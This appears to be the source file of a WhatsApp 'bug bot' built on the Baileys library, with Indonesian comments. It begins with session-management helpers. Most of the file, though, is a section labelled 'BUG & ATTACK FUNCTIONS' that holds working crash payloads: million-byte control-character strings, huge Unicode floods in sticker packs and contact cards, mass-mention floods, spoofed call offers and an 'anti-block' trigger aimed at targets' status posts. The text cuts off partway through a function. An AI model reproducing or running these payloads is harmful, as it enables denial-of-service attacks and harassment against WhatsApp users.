const fs = require('fs');
const path = require('path');
const { 
    makeWASocket, 
    useMultiFileAuthState, 
    DisconnectReason, 
    fetchLatestBaileysVersion, 
    generateWAMessageFromContent, 
    prepareWAMessageMedia, 
    proto, 
    jidEncode, 
    jidDecode, // Perbaikan: huruf kecil
    encodeWAMessage, 
    encodeSignedDeviceIdentity 
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const { logger } = require('../utils/logger');
// Pastikan path databaseService sesuai dengan struktur folder Anda
// const { loadKeyList, saveKeyList } = require('./databaseService'); 
const { safeStringify } = require('../utils/serialize_helper');
const crypto = require('crypto');

// Global State
const activeConnections = {};
const biz = {};   // Untuk WA Business
const mess = {};  // Untuk WA Messenger

// ==========================================
// HELPER FUNCTIONS
// ==========================================

// Cek Role (Termasuk High Owner)
function isVipOrOwner(user) {
  return user && ["vip", "dev"].includes(user.role);
}

function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// ==========================================
// SESSION MANAGEMENT: VIP
// ==========================================

function getVipSessionPath(sessionName) {
  return path.join('./vip', sessionName);
}

function prepareVipSessionFolders() {
  const vipFolder = './vip';
  try {
    if (!fs.existsSync(vipFolder)) {
      fs.mkdirSync(vipFolder, { recursive: true });
      logger.info("Folder session VIP dibuat.");
    }

    const files = fs.readdirSync(vipFolder).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      // logger.info("Folder session VIP kosong.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(vipFolder, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      
      const source = path.join(vipFolder, file);
      const dest = path.join(sessionPath, 'creds.json');
      
      // Copy creds jika belum ada di folder session
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }

    return files;
  } catch (err) {
    logger.error("Error menyiapkan folder session VIP:", err.message);
    return [];
  }
}

async function connectVipSession(sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionPath = getVipSessionPath(sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"], // Browser spoofing agar lebih stabil
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;
          logger.info(`[VIP ${sessionName}] Terhubung ✅`);

          const type = detectWATypeFromCreds(`${sessionPath}/creds.json`);
          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }

          resolve();
        } else if (connection === "close") {
          logger.warn(`[VIP ${sessionName}] Koneksi ditutup. Status: ${statusCode}`);

          if (statusCode === 440) {
             logger.error(`[VIP ${sessionName}] Session Invalid/Overwrite.`);
             delete activeConnections[sessionName];
             // Hati-hati menghapus folder otomatis, opsional:
             // fs.rmSync(sessionPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectVipSession(sessionName, retries - 1));
          } else {
            logger.error(`[VIP ${sessionName}] Logout atau maksimal percobaan tercapai.`);
            delete activeConnections[sessionName];
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[VIP ${sessionName}] Gagal memuat: ${err.message}`);
      resolve();
    }
  });
}

async function startVipSessions() {
  const files = prepareVipSessionFolders();
  if (files.length === 0) return;

  logger.info(`[VIP] Memulai ${files.length} session VIP/Owner...`);

  for (const file of files) {
    const baseName = path.basename(file, '.json');
    if (activeConnections[baseName]) continue;
    await connectVipSession(baseName);
  }
}

function getActiveVipConnections() {
  const vipConnections = {};
  for (const sessionName in activeConnections) {
    if (fs.existsSync(getVipSessionPath(sessionName))) {
      vipConnections[sessionName] = activeConnections[sessionName];
    }
  }
  return vipConnections;
}

function isVipSession(sessionName) {
  return fs.existsSync(getVipSessionPath(sessionName));
}

function getRandomVipConnection() {
  const vipConnections = getActiveVipConnections();
  const sessionNames = Object.keys(vipConnections);
  if (sessionNames.length === 0) return null;
  const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
  return vipConnections[randomSession];
}

// ==========================================
// SESSION MANAGEMENT: REGULAR (MEMBER)
// ==========================================

function prepareAuthFolders() {
  const userId = "permenmd";
  try {
    if (!fs.existsSync(userId)) {
      fs.mkdirSync(userId, { recursive: true });
      logger.info("Folder utama '" + userId + "' dibuat otomatis.");
    }

    const files = fs.readdirSync(userId).filter(file => file.endsWith('.json'));
    if (files.length === 0) {
      // logger.warn("Folder '" + userId + "' belum ada session.");
      return [];
    }

    for (const file of files) {
      const baseName = path.basename(file, '.json');
      const sessionPath = path.join(userId, baseName);
      if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath);
      const source = path.join(userId, file);
      const dest = path.join(sessionPath, 'creds.json');
      if (!fs.existsSync(dest)) fs.copyFileSync(source, dest);
    }
    return files;
  } catch (err) {
    logger.error("Error prepareAuthFolders: " + err.message);
    return [];
  }
}

function detectWATypeFromCreds(filePath) {
  if (!fs.existsSync(filePath)) return 'Unknown';
  try {
    const creds = JSON.parse(fs.readFileSync(filePath));
    const platform = creds?.platform || creds?.me?.platform || 'unknown';
    if (platform.includes("business") || platform === "smba") return "Business";
    if (platform === "android" || platform === "ios") return "Messenger";
    return "Unknown";
  } catch {
    return "Unknown";
  }
}

async function connectSession(folderPath, sessionName, retries = 100) {
  return new Promise(async (resolve) => {
    try {
      const sessionsFold = path.join(folderPath, sessionName);
      const { state, saveCreds } = await useMultiFileAuthState(sessionsFold);
      const { version } = await fetchLatestBaileysVersion();

      const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        version: version,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
        defaultQueryTimeoutMs: undefined,
      });

      sock.ev.on("creds.update", saveCreds);

      sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
        const statusCode = lastDisconnect?.error?.output?.statusCode;
        const isLoggedOut = statusCode === DisconnectReason.loggedOut || statusCode === 403;

        if (connection === "open") {
          activeConnections[sessionName] = sock;

          const type = detectWATypeFromCreds(path.join(sessionsFold, 'creds.json'));
          logger.info(`[${sessionName}] Connected. Type: ${type}`);

          if (type === "Business") {
            biz[sessionName] = sock;
          } else if (type === "Messenger") {
            mess[sessionName] = sock;
          }
          resolve();
        } else if (connection === "close") {
          logger.info(`[${sessionName}] Connection closed. Status: ${statusCode}`);

          if (statusCode === 440) {
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true });
          } else if (!isLoggedOut && retries > 0) {
            await sleep(3000);
            resolve(await connectSession(folderPath, sessionName, retries - 1));
          } else {
            logger.info(`[${sessionName}] Logged out.`);
            delete activeConnections[sessionName];
            fs.rmSync(folderPath, { recursive: true, force: true }); // Hapus folder jika logout
            resolve();
          }
        }
      });
    } catch (err) {
      logger.error(`[${sessionName}] Error: ${err.message}`);
      resolve();
    }
  });
}

// Check Active Session Priority (VIP First for High Owner/Owner/VIP)
function checkActiveSessionInFolder(subfolderName, isVipOrOwnerUser = false) {
  // 1. Prioritas VIP/High Owner/Owner
  if (isVipOrOwnerUser) {
    const vipConnections = getActiveVipConnections();
    const sessionNames = Object.keys(vipConnections);
    
    if (sessionNames.length > 0) {
      const randomSession = sessionNames[Math.floor(Math.random() * sessionNames.length)];
      return vipConnections[randomSession];
    }
  }
  
  // 2. Fallback ke session biasa (folder permenmd)
  const folderPath = path.join('permenmd', subfolderName);
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName];
    }
  }
  return null;
}

async function startUserSessions() {
  try {
    // 1. Start VIP Sessions First
    await startVipSessions();

    // 2. Start Member Sessions
    if (!fs.existsSync('permenmd')) {
        fs.mkdirSync('permenmd');
    }

    const subfolders = fs.readdirSync('permenmd')
      .map(name => path.join('permenmd', name))
      .filter(p => fs.statSync(p).isDirectory());

    logger.info(`[DEBUG] Ditemukan ${subfolders.length} subfolder member di 'permenmd'`);

    for (const folder of subfolders) {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          continue;
        }

        // Jalankan session member
        // Tidak perlu await agar paralel dan lebih cepat startnya
        connectSession(folder, sessionName).catch(err => {
             logger.error(`Gagal start session member ${sessionName}: ${err.message}`);
        });
      }
    }
  } catch (err) {
    logger.error("Fatal error in startUserSessions: " + err.message);
  }
}

async function disconnectAllActiveConnections() {
  for (const sessionName in activeConnections) {
    const sock = activeConnections[sessionName];
    try {
      sock.ws.close();
      logger.info(`[${sessionName}] Disconnected.`);
    } catch (e) {
      logger.error(`[${sessionName}] Gagal disconnect: ${e.message}`);
    }
    delete activeConnections[sessionName];
  }
  logger.info('✅ Semua sesi dari activeConnections berhasil disconnect.');
}

// ==========================================
// BUG & ATTACK FUNCTIONS (Use with Caution)
// ==========================================

async function delayNew(sock, target) {
  let JsonExp = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " Kkkk ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  let JsonExp2 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " is back?! ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  let JsonExp3 = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            contextInfo: {
              remoteJid: " xrl #1st ",
              mentionedJid: ["13135559098@s.whatsapp.net"],
            },
            body: {
              text: "@xrelly • #fvcker 🩸",
              format: "DEFAULT",
            },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: `{"values":{"in_pin_code":"7205","building_name":"russian motel","address":"2.7205","tower_number":"507","city":"Batavia","name":"dvx","phone_number":"+13135550202","house_number":"7205826","floor_number":"16","state":"${"\x10".repeat(1000000)}"}}`,
              version: 3,
            },
          },
        },
      },
    },
    {
      participant: { jid: target },
    },
  );
  
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp.message,
      },
    },
    xrl
      ? { messageId: JsonExp.key.id, participant: { jid: target } }
      : { messageId: JsonExp.key.id },
  );

  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp2.message,
      },
    },
    xrl
      ? { messageId: JsonExp2.key.id, participant: { jid: target } }
      : { messageId: JsonExp2.key.id },
  );
  
  await sock.relayMessage(
    target,
    {
      groupStatusMessageV2: {
        message: JsonExp3.message,
      },
    },
    xrl
      ? { messageId: JsonExp3.key.id, participant: { jid: target } }
      : { messageId: JsonExp3.key.id },
  );
}

async function FreezePackk(tdx, target) {
  await tdx.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(70000),
      publisher: "[DarkVerse]" + "ꦾ".repeat(500),
      stickers: [],
      fileLength: "3662919",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: ["13135550202@s.whatsapp.net"]
      },
      packDescription: "",
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "3680054",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}

async function XMmL(sock, target) {
  const msg = generateWAMessageFromContent(target, {
    sendPaymentMessage: {}
  }, {});
  sock.relayMessage(target, {
    ephemeralMessage: {
      message: msg.message
    }
  }, {
    participant: { jid: target }
  })
}

async function gsIntX(sock, target) {
  const RX7 = generateWAMessageFromContent(target, { 
    interactiveResponseMessage: {
      body: {
        text: "Rx7",
        format: "DEFAULT",
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: "\x10".repeat(500000),
        version: 3
      }
    }
  }, {});
  await sock.relayMessage(target, {
    groupStatusMessageV2: {
      message: RX7.message,
    },
  }, { messageId: RX7.key.id }
  );
}

async function FriendFcAntiBlock(sock, target) {
  console.log(`ATTACK MODE : ${target.split('@')[0]}`);
  console.log(`TARGET HARUS BIKIN STATUS`);
  
  const AntiBlokCrash = {
    requestPaymentMessage: {
      currencyCodeIso4217: 'IDR',
      amount1000: '999999999990',
      requestFrom: target, 
      noteMessage: {
        extendedTextMessage: {
          text: "ြ".repeat(1500), 
          contextInfo: {
            externalAdReply: {
              title: "VISI NIH",
              body: "ြ".repeat(1500),
              mediaType: 2,
              renderLargerThumbnail: true,
              showAdAttribution: true,
              sourceUrl: 'https://t.me/Deniss_erorr',
              thumbnailUrl: 'https://files.catbox.moe/87l7gz.jpeg'
            }
          }
        }
      },
      expiryTimestamp: Date.now() + 86400000,
    }
  };

  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    const msg = messages[0];
    if (!msg.message || type !== 'notify') return;
    const isStatusMessage = msg.key.remoteJid === 'status@broadcast';
    
    const isFromTarget = msg.key.participant === target; 
    if (isStatusMessage && isFromTarget) {
      console.log(`DETECT TARGET`);

      await sock.sendMessage(
        target, 
        AntiBlokCrash,    
        {
          quoted: msg,
          messageId: crypto.randomBytes(10).toString('hex').toUpperCase()
        }
      );

      console.log(`DONE BANG KE ${target.split('@')[0]} ANTI BLOCKIR`);
    }
  });
}

async function quizzzz(WaSocket, target) {
  const options = [
    { optionName: "7eppeli Istri Yasuho" },
    { optionName: "7eppeli Istri Reimi" },
    { optionName: "7eppeli Pedo" }
  ];

  const correctAnswer = options[2];

  const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32), 
          messageAssociation: {
            associationType: 7,
            parentMessageKey: crypto.randomBytes(16)
          }
        }, 
        pollCreationMessage: {
          name: "7eppeli.pdf", 
          options: options,
          selectableOptionsCount: 1,
          pollType: "QUIZ",
          correctAnswer: correctAnswer
        }
      }
    }
  }, {});

  await WaSocket.relayMessage(target, msg.message, {
    messageId: msg.key.id, 
    participant: { jid:target }
  });
}

async function GCquizzzz(WaSocket, target) {
  const options = [
    { optionName: "Belum" },
    { optionName: "Minum" },
    { optionName: "Makan" }
  ];

  const correctAnswer = options[2];

  const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
      message: {
        messageContextInfo: {
          messageSecret: crypto.randomBytes(32), 
          messageAssociation: {
            associationType: 7,
            parentMessageKey: crypto.randomBytes(16)
          }
        }, 
        pollCreationMessage: {
          name: "ꦾ".repeat(2000), 
          options: options,
          selectableOptionsCount: 1,
          pollType: "QUIZ",
          correctAnswer: correctAnswer
        }
      }
    }
  }, {});

  await WaSocket.relayMessage(target, msg.message, {
    messageId: msg.key.id, 
  });
}

async function fcinvisotax(Yuukey, target) {
const { jidDecode, jidEncode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@whiskeysockets/baileys");
let devices = (
await Yuukey.getUSyncDevices([target], false, false)
).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

await Yuukey.assertSessions(devices)

let xnxx = () => {
let map = {};
return {
mutex(key, fn) {
map[key] ??= { task: Promise.resolve() };
map[key].task = (async prev => {
try { await prev; } catch {}
return fn();
})(map[key].task);
return map[key].task;
}
};
};

let memek = xnxx();
let bokep = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
let porno = Yuukey.createParticipantNodes.bind(Yuukey);
let yntkts = Yuukey.encodeWAMessage?.bind(Yuukey);

Yuukey.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };

let patched = await (Yuukey.patchMessageBeforeSending?.(message, recipientJids) ?? message);
let ywdh = Array.isArray(patched)
? patched
: recipientJids.map(jid => ({ recipientJid: jid, message: patched }));

let { id: meId, lid: meLid } = Yuukey.authState.creds.me;
let omak = meLid ? jidDecode(meLid)?.user : null;
let shouldIncludeDeviceIdentity = false;

let nodes = await Promise.all(ywdh.map(async ({ recipientJid: jid, message: msg }) => {
let { user: targetUser } = jidDecode(jid);
let { user: ownPnUser } = jidDecode(meId);
let isOwnUser = targetUser === ownPnUser || targetUser === omak;
let y = jid === meId || jid === meLid;
if (dsmMessage && isOwnUser && !y) msg = dsmMessage;

let bytes = bokep(yntkts ? yntkts(msg) : encodeWAMessage(msg));

return memek.mutex(jid, async () => {
let { type, ciphertext } = await Yuukey.signalRepository.encryptMessage({ jid, data: bytes });
if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
return {
tag: 'to',
attrs: { jid },
content: [{ tag: 'enc', attrs: { v: '2', type, ...extraAttrs }, content: ciphertext }]
};
});
}));

return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
};

let awik = crypto.randomBytes(32);
let awok = Buffer.concat([awik, Buffer.alloc(8, 0x01)]);
let { nodes: destinations, shouldIncludeDeviceIdentity } = await Yuukey.createParticipantNodes(devices, { conversation: "7eppeli - Exposed" }, { count: '0' });

let stanza = {
tag: "call",
attrs: { to: target, id: Yuukey.generateMessageTag(), from: Yuukey.user.id },
content: [{
tag: "offer",
attrs: {
"call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
"call-creator": Yuukey.user.id
},
content: [
{ tag: "audio", attrs: { enc: "opus", rate: "16000" } },
{ tag: "audio", attrs: { enc: "opus", rate: "8000" } },
{ tag: "net", attrs: { medium: "3" } },
{ tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
{ tag: "encopt", attrs: { keygen: "2" } },
{ tag: "destination", attrs: {}, content: destinations },
...(shouldIncludeDeviceIdentity ? [{
tag: "device-identity",
attrs: {},
content: encodeSignedDeviceIdentity(Yuukey.authState.creds.account, true)
}] : [])
]
}]
};

await Yuukey.sendNode(stanza);
}
    
async function permenCall(sock, toJid, isVideo = true) {
  // jidEncode dan encodeSignedDeviceIdentity sudah diimport di atas
  const callId = crypto.randomBytes(16).toString('hex').toUpperCase().substring(0, 64);
  const encKey = crypto.randomBytes(32);
  
  // Pastikan getUSyncDevices tersedia
  if (!sock.getUSyncDevices) return { error: "Socket tidak mendukung USync" };

  try {
      const devices = (await sock.getUSyncDevices([toJid], true, false))
        .map(({ user, device }) => jidEncode(user, 's.whatsapp.net', device));

      await sock.assertSessions(devices, true);

      const { nodes: destinations, shouldIncludeDeviceIdentity } = await sock.createParticipantNodes(devices, {
        call: { callKey: new Uint8Array(encKey) }
      }, { count: '2' });

      const offerContent = [
        { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
        { tag: "audio", attrs: { enc: "opus", rate: "8000" } },
        {
          tag: "video",
          attrs: {
            orientation: "0",
            screen_width: "1920",
            screen_height: "1080",
            device_orientation: "0",
            enc: "vp8",
            dec: "vp8"
          }
        },
        { tag: "net", attrs: { medium: "3" } },
        { tag: "capability", attrs: { ver: "1" }, content: new Uint8Array([1, 5, 247, 9, 228, 250, 1]) },
        { tag: "encopt", attrs: { keygen: "2" } },
        { tag: "destination", attrs: {}, content: destinations },
        ...(shouldIncludeDeviceIdentity ? [{
          tag: "device-identity",
          attrs: {},
          content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
        }] : [])
      ].filter(Boolean);

      const stanza = {
        tag: 'call',
        attrs: {
          id: sock.generateMessageTag(),
          from: sock.user.id,
          to: toJid
        },
        content: [{
          tag: 'offer',
          attrs: {
            'call-id': callId,
            'call-creator': sock.user.id
          },
          content: offerContent
        }]
      };

      await sock.query(stanza);
      return { id: callId, to: toJid };
  } catch (err) {
      logger.error("❌ Error permenCall:", err.message);
      return { error: err.message };
  }
}

async function fcinvis(sock, target) {
  await sock.relayMessage("status@broadcast", {
    groupStatusMessageV2: {
      message: {
        extendedTextMessage: {
          text: "🩸JustinOfficial" + "\0".repeat(100) + "🩸JustinOfficial", 
          matchedText: "🩸JustinOfficial", 
          jpegThumbnail: null, 
          previewType: 6,
          paymentLinkMetadata: {
            button: {
              displayText: "Where's my mind?"
            }, 
            header: {
              headerType: 1
            }, 
            provider: {
              paramsJson: "{".repeat(20000)
            }
          }, 
          contextInfo: {
            mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 725}@s.whatsapp.net`), 
            isForwarded: true, 
            forwardedNewsletterMessageInfo: {
              newsletterJid: "120372075681@newsletter", 
              newsletterName: "🩸JustinOfficial", 
              serverMessageId: 7205
            }
          }
        }
      }
    }
  }, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {
        status_setting: "allowlist"
      },
      content: [
        {
          tag: "mentioned_users",
          attrs: {},
          content: [
            {
              tag: "to",
              attrs: {
                jid: target
              }
            }
          ]
        }
      ]
    }]
  });
}

async function XiosSejaya(sock, target) {
  const floods = 1900; 
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  await sock.relayMessage(target, {
    contactsArrayMessage: {
      displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>" + "𑇂𑆵𑆴𑆿".repeat(60000),
      contacts: [
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        },
        {
          displayName: "‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>",
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>;;;\nFN:‼️⃟ ༚ С𝛆ну‌‌‌‌ 𝔇𝔢𝔞𝔱𝝒 ⃨𝙲᪻𝒐‌‌‌‌𝖗𝚎ᜆ‌‌‌‌⋆>\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
        }
      ],
      contextInfo: {
        forwardingScore: 1,
        isForwarded: true,
        mentionedJid: mentionedJids, 
        quotedAd: {
          advertiserName: "x",
          mediaType: "IMAGE",
          jpegThumbnail: null,
          caption: "x"
        },
        placeholderKey: {
          remoteJid: "0@s.whatsapp.net",
          fromMe: false,
          id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: { jid: target } });
}

async function clickCrashBlankDelay(sock, target) {
  await sock.relayMessage(
    target,
    {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " @xrelly ",
              locationMessage: {
                degreesLatitude: -999.03499999999999,
                degreesLongitude: 922.9999999999999,
                name: " Tr4sh Xrelly ",
                address: "X",
                jpegThumbnail: null,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "address_message",
                  buttonParamsJson: "[".repeat(5000),
                },
                {
                  name: "galaxy_message",
                  buttonParamsJson: "{".repeat(3888),
                },
              ],
              messageParamsJson: "Wa.me/stickerpack/xrelly",
              messageVersion: 1,
            },
          },
        },
      },
    },
    { participant: { jid: target } },
  );

  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "༘XrL‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "༘XrL‣" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["🦠"],
            accessibilityLabel: "dvx",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
